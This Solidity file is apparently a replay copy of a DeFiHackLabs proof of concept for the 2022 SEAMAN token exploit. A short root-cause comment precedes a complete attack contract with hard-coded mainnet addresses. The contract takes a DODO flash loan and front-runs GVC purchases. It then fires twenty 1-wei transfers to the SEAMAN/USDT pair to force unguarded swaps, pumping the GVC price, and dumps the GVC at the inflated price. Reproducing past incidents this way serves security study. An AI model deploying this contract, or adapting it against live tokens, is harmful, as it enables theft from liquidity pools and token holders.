// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-SEAMAN).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// DODO flash-loan callback `DPPFlashLoanCall` lives on the test itself, so there
// is no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + DPPFlashLoanCall + USDTToSEAMAN +
// USDTToGVC + GVCToUSDT), so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/SEAMAN_exp.sol.
//
// Root cause: SEAMAN's `_transfer` hook fires `swapAndLiquifyV3/V1` on ANY transfer
// to the SEAMAN/USDT pair (even 1 wei, by anyone), which forces the contract to
// market-buy GVC via the hard-coded SEAMAN -> USDT -> GVC path with no slippage
// guard. The attacker front-runs by buying GVC in the thin USDT/GVC pool, pumps
// the price 20× via 1-wei transfer triggers, then dumps the GVC back at the
// elevated price — netting ~7,781.78 USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract SEAMANExploit {
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant SEAMAN = IERC20(0x6bc9b4976ba6f8C9574326375204eE469993D038);
    IERC20 constant GVC = IERC20(0xDB95FBc5532eEb43DeEd56c8dc050c930e31017e);
    IUniswapV2Router02 constant Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant DODO = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    address constant PAIR = 0x6637914482670f91F43025802b6755F27050b0a6; // SEAMAN/USDT pair

    // Step 0: borrow 800,000 USDT from DODO; the callback does the manipulation + repay.
    function run() external {
        IDVM(DODO).flashLoan(0, 800_000 * 1e18, address(this), new bytes(1));
    }

    // DODO DPP flash-loan callback.
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        USDT.approve(address(Router), type(uint256).max);
        USDTToSEAMAN();
        USDTToGVC();
        for (uint256 i = 0; i < 20; i++) {
            SEAMAN.transfer(PAIR, 1);
        }
        GVCToUSDT();
        USDT.transfer(DODO, 800_000 * 1e18);
    }

    function USDTToSEAMAN() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(SEAMAN);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(10 * 1e9, 0, path, address(this), block.timestamp);
    }

    function USDTToGVC() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(GVC);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            500_000 * 1e18, 0, path, address(this), block.timestamp
        );
    }

    function GVCToUSDT() internal {
        GVC.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(GVC);
        path[1] = address(USDT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            GVC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
